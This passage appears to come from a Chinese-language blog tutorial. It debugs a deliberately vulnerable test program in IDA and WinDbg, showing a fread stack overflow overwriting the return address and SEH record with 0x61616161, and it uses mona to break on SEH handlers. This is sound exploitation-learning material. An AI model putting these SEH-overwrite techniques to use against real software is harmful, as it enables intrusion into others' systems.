<span class="hljs-label">.text:</span><span class="hljs-number">00401056</span>                 <span class="hljs-keyword">mov</span>     dword ptr [ebp&#43;msg&#43;<span class="hljs-number">19</span>h], <span class="hljs-number">0</span>
<span class="hljs-label">.text:</span><span class="hljs-number">0040105</span>D                 <span class="hljs-keyword">mov</span>     word ptr [ebp&#43;msg&#43;<span class="hljs-number">1</span>Dh], <span class="hljs-number">0</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401063</span>                 <span class="hljs-keyword">mov</span>     [ebp&#43;msg&#43;<span class="hljs-number">1</span>Fh], <span class="hljs-number">0</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401067</span>                 <span class="hljs-keyword">call</span>    ds:__imp__printf
<span class="hljs-label">.text:</span><span class="hljs-number">0040106</span>D                 <span class="hljs-keyword">push</span>    offset Mode     <span class="hljs-comment">; &#34;rb&#34;</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401072</span>                 <span class="hljs-keyword">push</span>    dword ptr [esi&#43;<span class="hljs-number">4</span>] <span class="hljs-comment">; Filename</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401075</span>                 <span class="hljs-keyword">call</span>    ds:__imp__fopen
<span class="hljs-label">.text:</span><span class="hljs-number">0040107</span>B                 <span class="hljs-keyword">mov</span>     ebx, eax
<span class="hljs-label">.text:</span><span class="hljs-number">0040107</span>D                 <span class="hljs-keyword">add</span>     esp, <span class="hljs-number">0</span>Ch
<span class="hljs-label">.text:</span><span class="hljs-number">00401080</span>                 test    ebx, ebx
<span class="hljs-label">.text:</span><span class="hljs-number">00401082</span>                 jnz     short loc_401097
<span class="hljs-label">.text:</span><span class="hljs-number">00401084</span>                 <span class="hljs-keyword">pop</span>     ebx
<span class="hljs-label">.text:</span><span class="hljs-number">00401085</span>                 <span class="hljs-keyword">or</span>      eax, <span class="hljs-number">0</span>FFFFFFFFh
<span class="hljs-label">.text:</span><span class="hljs-number">00401088</span>                 <span class="hljs-keyword">pop</span>     esi
<span class="hljs-label">.text:</span><span class="hljs-number">00401089</span>                 <span class="hljs-keyword">mov</span>     ecx, [ebp&#43;var_4]
<span class="hljs-label">.text:</span><span class="hljs-number">0040108</span>C                 xor     ecx, ebp        <span class="hljs-comment">; cookie</span>
<span class="hljs-label">.text:</span><span class="hljs-number">0040108</span>E                 <span class="hljs-keyword">call</span>    &#64;__security_check_cookie<span class="hljs-localvars">&#64;4</span> <span class="hljs-comment">; __security_check_cookie(x)</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401093</span>                 <span class="hljs-keyword">mov</span>     esp, ebp
<span class="hljs-label">.text:</span><span class="hljs-number">00401095</span>                 <span class="hljs-keyword">pop</span>     ebp
<span class="hljs-label">.text:</span><span class="hljs-number">00401096</span>                 retn
<span class="hljs-label">.text:</span><span class="hljs-number">00401097</span> <span class="hljs-comment">; ---------------------------------------------------------------------------</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401097</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401097</span> loc_401097:                             <span class="hljs-comment">; CODE XREF: _main&#43;82j</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401097</span>                 <span class="hljs-keyword">mov</span>     esi, ds:__imp__fseek
<span class="hljs-label">.text:</span><span class="hljs-number">0040109</span>D                 <span class="hljs-keyword">push</span>    edi
<span class="hljs-label">.text:</span><span class="hljs-number">0040109</span>E                 <span class="hljs-keyword">push</span>    <span class="hljs-number">2</span>               <span class="hljs-comment">; Origin</span>
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>A0                 <span class="hljs-keyword">push</span>    <span class="hljs-number">0</span>               <span class="hljs-comment">; Offset</span>
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>A2                 <span class="hljs-keyword">push</span>    ebx             <span class="hljs-comment">; File</span>
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>A3                 <span class="hljs-keyword">call</span>    esi <span class="hljs-comment">; __imp__fseek</span>
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>A5                 <span class="hljs-keyword">push</span>    ebx             <span class="hljs-comment">; File</span>
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>A6                 <span class="hljs-keyword">call</span>    ds:__imp__ftell
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>AC                 <span class="hljs-keyword">push</span>    <span class="hljs-number">0</span>               <span class="hljs-comment">; Origin</span>
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>AE                 <span class="hljs-keyword">push</span>    <span class="hljs-number">0</span>               <span class="hljs-comment">; Offset</span>
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>B0                 <span class="hljs-keyword">push</span>    ebx             <span class="hljs-comment">; File</span>
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>B1                 <span class="hljs-keyword">mov</span>     [ebp&#43;var_28], eax
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>B4                 <span class="hljs-keyword">call</span>    esi <span class="hljs-comment">; __imp__fseek</span>
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>B6                 <span class="hljs-keyword">mov</span>     eax, [ebp&#43;var_28]
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>B9                 <span class="hljs-keyword">add</span>     esp, <span class="hljs-number">1</span>Ch
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>BC                 xor     edi, edi
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>BE                 test    eax, eax
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>C0                 jle     short loc_4010FE
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>C2                 <span class="hljs-keyword">mov</span>     ecx, <span class="hljs-number">0</span>C8h
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>C7                 <span class="hljs-keyword">jmp</span>     short loc_4010D0
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>C7 <span class="hljs-comment">; ---------------------------------------------------------------------------</span>
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>C9                 align <span class="hljs-number">10</span>h
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>D0
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>D0 loc_4010D0:                             <span class="hljs-comment">; CODE XREF: _main&#43;C7j</span>
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>D0                                         <span class="hljs-comment">; _main&#43;FCj</span>
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>D0                 <span class="hljs-keyword">mov</span>     esi, eax
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>D2                 <span class="hljs-keyword">sub</span>     esi, edi
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>D4                 cmp     esi, <span class="hljs-number">0</span>C8h
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>DA                 cmovg   esi, ecx
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>DD                 <span class="hljs-keyword">push</span>    ebx             <span class="hljs-comment">; File</span>
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>DE                 <span class="hljs-keyword">push</span>    esi             <span class="hljs-comment">; Count</span>
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>DF                 lea     eax, [ebp&#43;msg]
<span class="hljs-label">.text:</span><span class="hljs-number">004010E2</span>                 <span class="hljs-keyword">add</span>     eax, edi
<span class="hljs-label">.text:</span><span class="hljs-number">004010E4</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-number">1</span>               <span class="hljs-comment">; ElementSize</span>
<span class="hljs-label">.text:</span><span class="hljs-number">004010E6</span>                 <span class="hljs-keyword">push</span>    eax             <span class="hljs-comment">; DstBuf</span>
<span class="hljs-label">.text:</span><span class="hljs-number">004010E7</span>                 <span class="hljs-keyword">call</span>    ds:__imp__fread
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>ED                 <span class="hljs-keyword">mov</span>     eax, [ebp&#43;var_28]
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>F0                 <span class="hljs-keyword">add</span>     edi, esi
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>F2                 <span class="hljs-keyword">add</span>     esp, <span class="hljs-number">10</span>h
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>F5                 <span class="hljs-keyword">mov</span>     ecx, <span class="hljs-number">0</span>C8h
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>FA                 cmp     edi, eax
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>FC                 jl      short loc_4010D0
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>FE
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>FE loc_4010FE:                             <span class="hljs-comment">; CODE XREF: _main&#43;C0j</span>
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>FE                 <span class="hljs-keyword">push</span>    ebx             <span class="hljs-comment">; File</span>
<span class="hljs-label">.text:</span><span class="hljs-number">004010</span>FF                 <span class="hljs-keyword">call</span>    ds:__imp__fclose
<span class="hljs-label">.text:</span><span class="hljs-number">00401105</span>                 lea     eax, [ebp&#43;msg]
<span class="hljs-label">.text:</span><span class="hljs-number">00401108</span>                 <span class="hljs-keyword">push</span>    eax
<span class="hljs-label">.text:</span><span class="hljs-number">00401109</span>                 <span class="hljs-keyword">push</span>    offset aS       <span class="hljs-comment">; &#34;%s\n&#34;</span>
<span class="hljs-label">.text:</span><span class="hljs-number">0040110</span>E                 <span class="hljs-keyword">call</span>    ds:__imp__printf
<span class="hljs-label">.text:</span><span class="hljs-number">00401114</span>                 <span class="hljs-keyword">mov</span>     ecx, [ebp&#43;var_4]
<span class="hljs-label">.text:</span><span class="hljs-number">00401117</span>                 <span class="hljs-keyword">add</span>     esp, <span class="hljs-number">0</span>Ch
<span class="hljs-label">.text:</span><span class="hljs-number">0040111</span>A                 xor     ecx, ebp        <span class="hljs-comment">; cookie</span>
<span class="hljs-label">.text:</span><span class="hljs-number">0040111</span>C                 <span class="hljs-keyword">pop</span>     edi
<span class="hljs-label">.text:</span><span class="hljs-number">0040111</span>D                 <span class="hljs-keyword">pop</span>     ebx
<span class="hljs-label">.text:</span><span class="hljs-number">0040111</span>E                 xor     eax, eax
<span class="hljs-label">.text:</span><span class="hljs-number">00401120</span>                 <span class="hljs-keyword">pop</span>     esi
<span class="hljs-label">.text:</span><span class="hljs-number">00401121</span>                 <span class="hljs-keyword">call</span>    &#64;__security_check_cookie<span class="hljs-localvars">&#64;4</span> <span class="hljs-comment">; __security_check_cookie(x)</span>
<span class="hljs-label">.text:</span><span class="hljs-number">00401126</span>                 <span class="hljs-keyword">mov</span>     esp, ebp
<span class="hljs-label">.text:</span><span class="hljs-number">00401128</span>                 <span class="hljs-keyword">pop</span>     ebp
<span class="hljs-label">.text:</span><span class="hljs-number">00401129</span>                 retn
<span class="hljs-label">.text:</span><span class="hljs-number">00401129</span> _main           endp
<span class="hljs-label">.text:</span><span class="hljs-number">00401129</span></code></pre> 
<p>因为开启了/GS&#xff0c;所以&#xff0c;会在汇编代码中找到security cookie之类的动作。我们知道fread会导致溢出&#xff0c;所以&#xff0c;我们直接在这里设置断点&#xff0c;观察执行以后的情况。</p> 
<pre class="prettyprint"><code class=" hljs avrasm"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; u test_x86_wo_safeseh_dep&#43;<span class="hljs-number">10E7</span>
test_x86_wo_safeseh_dep!main&#43;<span class="hljs-number">0xe7</span> [<span class="hljs-built_in">z</span>:\d_disk\workspace\vs_2012\test\stack_overflow<span class="hljs-preprocessor">.cpp</span> &#64; <span class="hljs-number">22</span>]:
<span class="hljs-number">013</span>c10e7 ff1598203c01    <span class="hljs-keyword">call</span>    dword ptr [test_x86_wo_safeseh_dep!_imp__fread (<span class="hljs-number">013</span>c2098)]
<span class="hljs-number">013</span>c10ed <span class="hljs-number">8</span>b45d8          <span class="hljs-keyword">mov</span>     eax,dword ptr [ebp-<span class="hljs-number">28</span>h]
<span class="hljs-number">013</span>c10f0 <span class="hljs-number">03</span>fe            <span class="hljs-keyword">add</span>     edi,esi
<span class="hljs-number">013</span>c10f2 <span class="hljs-number">83</span>c410          <span class="hljs-keyword">add</span>     esp,<span class="hljs-number">10</span>h
<span class="hljs-number">013</span>c10f5 b9c8000000      <span class="hljs-keyword">mov</span>     ecx,<span class="hljs-number">0</span>C8h
<span class="hljs-number">013</span>c10fa <span class="hljs-number">3</span>bf8            cmp     edi,eax
<span class="hljs-number">013</span>c10fc <span class="hljs-number">7</span>cd2            jl      test_x86_wo_safeseh_dep!main&#43;<span class="hljs-number">0xd0</span> (<span class="hljs-number">013</span>c10d0)
<span class="hljs-number">013</span>c10fe <span class="hljs-number">53</span>              <span class="hljs-keyword">push</span>    ebx
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; bp test_x86_wo_safeseh_dep&#43;<span class="hljs-number">10E7</span></code></pre> 
<p>F5继续执行&#xff0c;断下来以后&#xff0c;我们看看将要被修改的memory内容&#xff0c;也就是EAX指向的位置。</p> 
<pre class="prettyprint"><code class=" hljs erlang-repl"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; <span class="hljs-function_or_atom">g</span>
<span class="hljs-variable">Breakpoint</span> <span class="hljs-number">1</span> <span class="hljs-function_or_atom">hit</span>
<span class="hljs-function_or_atom">eax</span>&#61;<span class="hljs-number">003</span>cfa70 <span class="hljs-function_or_atom">ebx</span>&#61;<span class="hljs-number">73987060</span> <span class="hljs-function_or_atom">ecx</span>&#61;<span class="hljs-number">000000</span>c8 <span class="hljs-function_or_atom">edx</span>&#61;<span class="hljs-number">0015</span>dfe8 <span class="hljs-function_or_atom">esi</span>&#61;<span class="hljs-number">000000</span>c8 <span class="hljs-function_or_atom">edi</span>&#61;<span class="hljs-number">00000000</span>
<span class="hljs-function_or_atom">eip</span>&#61;<span class="hljs-number">013</span>c10e7 <span class="hljs-function_or_atom">esp</span>&#61;<span class="hljs-number">003</span>cfa50 <span class="hljs-function_or_atom">ebp</span>&#61;<span class="hljs-number">003</span>cfa94 <span class="hljs-function_or_atom">iopl</span>&#61;<span class="hljs-number">0</span>         <span class="hljs-function_or_atom">nv</span> <span class="hljs-function_or_atom">up</span> <span class="hljs-function_or_atom">ei</span> <span class="hljs-function_or_atom">pl</span> <span class="hljs-function_or_atom">nz</span> <span class="hljs-function_or_atom">na</span> <span class="hljs-function_or_atom">po</span> <span class="hljs-function_or_atom">nc</span>
<span class="hljs-function_or_atom">cs</span>&#61;<span class="hljs-number">0023</span>  <span class="hljs-function_or_atom">ss</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">ds</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">es</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">fs</span>&#61;<span class="hljs-number">0053</span>  <span class="hljs-function_or_atom">gs</span>&#61;<span class="hljs-number">002</span>b             <span class="hljs-function_or_atom">efl</span>&#61;<span class="hljs-number">00000202</span>
<span class="hljs-function_or_atom">test_x86_wo_safeseh_dep</span><span class="hljs-exclamation_mark">!</span><span class="hljs-function_or_atom">main</span>&#43;<span class="hljs-number">0</span>xe7:
<span class="hljs-number">013</span>c10e7 <span class="hljs-function_or_atom">ff1598203c01</span>    <span class="hljs-function_or_atom">call</span>    <span class="hljs-function_or_atom">dword</span> <span class="hljs-function_or_atom">ptr</span> [<span class="hljs-function_or_atom">test_x86_wo_safeseh_dep</span><span class="hljs-exclamation_mark">!</span>_imp__fread (<span class="hljs-number">013</span>c2098)] <span class="hljs-function_or_atom">ds</span>:<span class="hljs-number">002</span>b:<span class="hljs-number">013</span>c2098&#61;{<!-- --><span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span><span class="hljs-function_or_atom">fread</span> (<span class="hljs-number">738</span>d88fc)}
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; <span class="hljs-function_or_atom">dd</span> <span class="hljs-number">003</span>cfa70
<span class="hljs-number">003</span>cfa70  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>
<span class="hljs-number">003</span>cfa80  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>
<span class="hljs-number">003</span>cfa90  <span class="hljs-function_or_atom">fe33e796</span> <span class="hljs-number">003</span>cfad4 <span class="hljs-number">013</span>c133a <span class="hljs-number">00000002</span>
<span class="hljs-number">003</span>cfaa0  <span class="hljs-number">00176</span>df8 <span class="hljs-number">00175260</span> <span class="hljs-function_or_atom">fe33e7d6</span> <span class="hljs-number">00000000</span>
<span class="hljs-number">003</span>cfab0  <span class="hljs-number">00000000</span> <span class="hljs-number">7</span>efde000 <span class="hljs-number">00000000</span> <span class="hljs-number">003</span>cfaa8
<span class="hljs-number">003</span>cfac0  <span class="hljs-number">0000008</span>b <span class="hljs-number">003</span>cfb10 <span class="hljs-number">013</span>c18e9 <span class="hljs-function_or_atom">ff333f22</span>
<span class="hljs-number">003</span>cfad0  <span class="hljs-number">00000000</span> <span class="hljs-number">003</span>cfae0 <span class="hljs-number">74</span>bb339a <span class="hljs-number">7</span>efde000
<span class="hljs-number">003</span>cfae0  <span class="hljs-number">003</span>cfb20 <span class="hljs-number">77359</span>ef2 <span class="hljs-number">7</span>efde000 <span class="hljs-number">7e8</span>bdd7f</code></pre> 
<p>单步执行以后&#xff0c;再看看原先的memory情况&#xff0c;可以发现相应位置的内容已经被覆写为0x61616161&#xff0c;原先的EBP和返回地址同样也被修改为0x61616161。</p> 
<pre class="prettyprint"><code class=" hljs makefile">0:000&gt; p
<span class="hljs-constant">eax</span>&#61;000000c8 ebx&#61;73987060 ecx&#61;738d88dc edx&#61;00000000 esi&#61;000000c8 edi&#61;00000000
<span class="hljs-constant">eip</span>&#61;013c10ed esp&#61;003cfa50 ebp&#61;003cfa94 iopl&#61;0         nv up ei pl nz na pe nc
<span class="hljs-constant">cs</span>&#61;0023  ss&#61;002b  ds&#61;002b  es&#61;002b  fs&#61;0053  gs&#61;002b             efl&#61;00000206
test_x86_wo_safeseh_dep!main&#43;0xed:
013c10ed 8b45d8          mov     eax,dword ptr [ebp-28h] ss:002b:003cfa6c&#61;00002710
0:000&gt; dd 003cfa70
003cfa70  61616161 61616161 61616161 61616161
003cfa80  61616161 61616161 61616161 61616161
003cfa90  61616161 61616161 61616161 61616161
003cfaa0  61616161 61616161 61616161 61616161
003cfab0  61616161 61616161 61616161 61616161
003cfac0  61616161 61616161 61616161 61616161
003cfad0  61616161 61616161 61616161 61616161
003cfae0  61616161 61616161 61616161 61616161
0:000&gt; dd
003cfaf0  61616161 61616161 61616161 61616161
003cfb00  61616161 61616161 61616161 61616161
003cfb10  61616161 61616161 61616161 61616161
003cfb20  61616161 61616161 61616161 61616161
003cfb30  61616161 61616161 00000000 00000000
003cfb40  013c13a2 7efde000 00000000 00000000
003cfb50  00000000 00000000 00000000 00000000
003cfb60  00000000 00000000 00000000 00000000
0:000&gt; dd 003cfa94 l2
003cfa94  61616161 61616161</code></pre> 
<p>调试的过程中&#xff0c;会发现程序会一直在下面的loop中执行&#xff0c;原因是msg.dat内容比较大&#xff0c;会持续地读取内容。 <br /> <img src="https://img-blog.csdn.net/20161218230355648?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZHVwZWk&#61;/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA&#61;&#61;/dissolve/70/gravity/SouthEast" alt="循环读取的汇编指令" title="" /></p> 
<p>为了跳过这段loop&#xff0c;我们可以在后面的PUSH EBX设断。不过&#xff0c;当使用F5 continue的时候&#xff0c;发现出现并没有断在我们刚刚设置的断点上&#xff0c;而是出现下面的exception。</p> 
<pre class="prettyprint"><code class=" hljs erlang-repl"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; <span class="hljs-function_or_atom">g</span>
(<span class="hljs-function_or_atom">ab8</span>.<span class="hljs-number">8</span>c8): <span class="hljs-variable">Access</span> <span class="hljs-function_or_atom">violation</span> - <span class="hljs-function_or_atom">code</span> <span class="hljs-function_or_atom">c0000005</span> (<span class="hljs-function_or_atom">first</span> <span class="hljs-function_or_atom">chance</span>)
<span class="hljs-variable">First</span> <span class="hljs-function_or_atom">chance</span> <span class="hljs-function_or_atom">exceptions</span> <span class="hljs-function_or_atom">are</span> <span class="hljs-function_or_atom">reported</span> <span class="hljs-function_or_atom">before</span> <span class="hljs-function_or_atom">any</span> <span class="hljs-function_or_atom">exception</span> <span class="hljs-function_or_atom">handling</span>.
<span class="hljs-variable">This</span> <span class="hljs-function_or_atom">exception</span> <span class="hljs-function_or_atom">may</span> <span class="hljs-function_or_atom">be</span> <span class="hljs-function_or_atom">expected</span> <span class="hljs-function_or_atom">and</span> <span class="hljs-function_or_atom">handled</span>.
<span class="hljs-function_or_atom">eax</span>&#61;<span class="hljs-number">002</span>b7be8 <span class="hljs-function_or_atom">ebx</span>&#61;<span class="hljs-number">000000</span>c8 <span class="hljs-function_or_atom">ecx</span>&#61;<span class="hljs-number">0000002</span>c <span class="hljs-function_or_atom">edx</span>&#61;<span class="hljs-number">00000000</span> <span class="hljs-function_or_atom">esi</span>&#61;<span class="hljs-number">00178418</span> <span class="hljs-function_or_atom">edi</span>&#61;<span class="hljs-number">003</span>d0000
<span class="hljs-function_or_atom">eip</span>&#61;<span class="hljs-number">738</span>ce33d <span class="hljs-function_or_atom">esp</span>&#61;<span class="hljs-number">003</span>cf990 <span class="hljs-function_or_atom">ebp</span>&#61;<span class="hljs-number">003</span>cf9b0 <span class="hljs-function_or_atom">iopl</span>&#61;<span class="hljs-number">0</span>         <span class="hljs-function_or_atom">nv</span> <span class="hljs-function_or_atom">up</span> <span class="hljs-function_or_atom">ei</span> <span class="hljs-function_or_atom">pl</span> <span class="hljs-function_or_atom">nz</span> <span class="hljs-function_or_atom">ac</span> <span class="hljs-function_or_atom">po</span> <span class="hljs-function_or_atom">nc</span>
<span class="hljs-function_or_atom">cs</span>&#61;<span class="hljs-number">0023</span>  <span class="hljs-function_or_atom">ss</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">ds</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">es</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">fs</span>&#61;<span class="hljs-number">0053</span>  <span class="hljs-function_or_atom">gs</span>&#61;<span class="hljs-number">002</span>b             <span class="hljs-function_or_atom">efl</span>&#61;<span class="hljs-number">00010212</span>
<span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span><span class="hljs-function_or_atom">memcpy</span>&#43;<span class="hljs-number">0</span>x21e:
<span class="hljs-number">738</span>ce33d <span class="hljs-function_or_atom">f3a5</span>            <span class="hljs-function_or_atom">rep</span> <span class="hljs-function_or_atom">movs</span> <span class="hljs-function_or_atom">dword</span> <span class="hljs-function_or_atom">ptr</span> <span class="hljs-function_or_atom">es</span>:[<span class="hljs-function_or_atom">edi</span>],<span class="hljs-function_or_atom">dword</span> <span class="hljs-function_or_atom">ptr</span> [<span class="hljs-function_or_atom">esi</span>]
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; <span class="hljs-function_or_atom">k</span>
<span class="hljs-variable">ChildEBP</span> <span class="hljs-variable">RetAddr</span>  
<span class="hljs-number">003</span>cf994 <span class="hljs-number">738</span>ce3b7 <span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span><span class="hljs-function_or_atom">memcpy</span>&#43;<span class="hljs-number">0</span>x21e
<span class="hljs-number">003</span>cf9b0 <span class="hljs-number">738</span>d8855 <span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span><span class="hljs-function_or_atom">memcpy_s</span>&#43;<span class="hljs-number">0</span>x3e
<span class="hljs-number">003</span>cf9e4 <span class="hljs-number">738</span>d88c1 <span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span>_fread_nolock_s&#43;<span class="hljs-number">0</span>xd3
<span class="hljs-number">003</span>cfa2c <span class="hljs-number">738</span>d8912 <span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span><span class="hljs-function_or_atom">fread_s</span>&#43;<span class="hljs-number">0</span>x6b
<span class="hljs-number">003</span>cfa48 <span class="hljs-number">013</span>c10ed <span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span><span class="hljs-function_or_atom">fread</span>&#43;<span class="hljs-number">0</span>x16
<span class="hljs-number">003</span>cfa94 <span class="hljs-number">61616161</span> <span class="hljs-function_or_atom">test_x86_wo_safeseh_dep</span><span class="hljs-exclamation_mark">!</span><span class="hljs-function_or_atom">main</span>&#43;<span class="hljs-number">0</span>xed [<span class="hljs-function_or_atom">z</span>:\<span class="hljs-function_or_atom">d_disk</span>\<span class="hljs-function_or_atom">workspace</span>\<span class="hljs-function_or_atom">vs_2012</span>\<span class="hljs-function_or_atom">test</span>\<span class="hljs-function_or_atom">stack_overflow</span>.<span class="hljs-function_or_atom">cpp</span> &#64; <span class="hljs-number">22</span>]</code></pre> 
<p>这个exception是由于访问违例导致的&#xff0c;可以看出&#xff0c;当前还是在fread函数中。使用!address命令可以看出目标地址EDI所指向的地址是READONLY属性&#xff0c;这就难怪为什么会出现访问违例了&#xff0c;不给写嘛&#xff01;</p> 
<pre class="prettyprint"><code class=" hljs lasso"><span class="hljs-number">0</span>:<span class="hljs-number">000</span><span class="hljs-subst">&gt;</span> <span class="hljs-subst">!</span>address <span class="hljs-number">003</span>d0000

Mapping file section regions<span class="hljs-attribute">...</span>
Mapping module regions<span class="hljs-attribute">...</span>
Mapping PEB regions<span class="hljs-attribute">...</span>
Mapping TEB <span class="hljs-literal">and</span> <span class="hljs-built_in">stack</span> regions<span class="hljs-attribute">...</span>
Mapping heap regions<span class="hljs-attribute">...</span>
Mapping page heap regions<span class="hljs-attribute">...</span>
Mapping other regions<span class="hljs-attribute">...</span>
Mapping <span class="hljs-built_in">stack</span> trace database regions<span class="hljs-attribute">...</span>
Mapping activation context regions<span class="hljs-attribute">...</span>

Usage:                  MappedFile
Base Address:           <span class="hljs-number">003</span>d0000
End Address:            <span class="hljs-number">00437000</span>
Region Size:            <span class="hljs-number">00067000</span>
State:                  <span class="hljs-number">00001000</span>    MEM_COMMIT
<span class="hljs-keyword">Protect</span>:                <span class="hljs-number">00000002</span>    PAGE_READONLY
<span class="hljs-keyword">Type</span>:                   <span class="hljs-number">00040000</span>    MEM_MAPPED
Allocation Base:        <span class="hljs-number">003</span>d0000
Allocation <span class="hljs-keyword">Protect</span>:     <span class="hljs-number">00000002</span>    PAGE_READONLY
Mapped file name:       <span class="hljs-subst">\</span>Device<span class="hljs-subst">\</span>HarddiskVolume2<span class="hljs-subst">\</span>Windows<span class="hljs-subst">\</span>System32<span class="hljs-subst">\</span>locale<span class="hljs-built_in">.</span>nls</code></pre> 
<p>总结一下&#xff1a;上面看到的exception是由于程序读入大量的内容&#xff0c;往栈上覆写&#xff0c;从003cfa94 往高地址写&#xff0c;一直写到003d0000&#xff0c;结果导致了访问违例。 <br /> 这个时候&#xff0c;我们看看exception chain的情况&#xff0c;可以看到下面这样的</p> 
<pre class="prettyprint"><code class=" hljs erlang-repl"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; <span class="hljs-exclamation_mark">!</span><span class="hljs-function_or_atom">exchain</span>
<span class="hljs-number">003</span>cfa1c: <span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span>_except_handler4&#43;<span class="hljs-number">0</span> (<span class="hljs-number">738</span>da6e0)
  <span class="hljs-variable">CRT</span> <span class="hljs-function_or_atom">scope</span>  <span class="hljs-number">0</span>, <span class="hljs-function_or_atom">func</span>:   <span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span><span class="hljs-function_or_atom">fread_s</span>&#43;<span class="hljs-number">83</span> (<span class="hljs-number">73911</span>cfc)
<span class="hljs-number">003</span>cfac4: <span class="hljs-number">61616161</span>
<span class="hljs-variable">Invalid</span> <span class="hljs-function_or_atom">exception</span> <span class="hljs-function_or_atom">stack</span> <span class="hljs-function_or_atom">at</span> <span class="hljs-number">61616161</span></code></pre> 
<p>为了看看exception handler是怎么被调用的&#xff0c;可以在上面的exception hander上设置断点&#xff0c;MONA提供命令可以给SEH 上的所有hander设置断点</p> 
<pre class="prettyprint"><code class=" hljs asciidoc">0:000&gt; !py mona bpseh
Hold on...
[&#43;] Command used:
!py mona.py bpseh
Nr of SEH records : 2
<span class="hljs-header">SEH Chain :
-----------</span>
Address     Next SEH    Handler
0x003cfa1c  0x003cfac4  0x738da6e0 MSVCR110!<span class="hljs-emphasis">_except_</span>handler4 &lt;- BP set
0x003cfac4  0x61616161  0x61616161  &lt;- BP set

[&#43;] This mona.py action took 0:00:00.094000</code></pre> 
<p>不过&#xff0c;继续执行以后会出现下面的错误&#xff0c;意思是说0x61616161这个位置不能用BP设置断点&#xff0c;原因是由于这个位置不可访问。</p> 
<pre class="prettyprint"><code class=" hljs livecodeserver"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; g
Unable <span class="hljs-built_in">to</span> insert <span class="hljs-built_in">breakpoint</span> <span class="hljs-number">4</span> <span class="hljs-keyword">at</span> <span class="hljs-number">61616161</span>, Win32 error <span class="hljs-number">0</span>n299
    <span class="hljs-string">&#34;Only part of a ReadProcessMemory or WriteProcessMemory request was completed.&#34;</span>
The <span class="hljs-built_in">breakpoint</span> was <span class="hljs-built_in">set</span> <span class="hljs-operator">with</span> BP.  If you want breakpoints
<span class="hljs-built_in">to</span> track module <span class="hljs-built_in">load</span>/<span class="hljs-built_in">unload</span> state you must use BU.
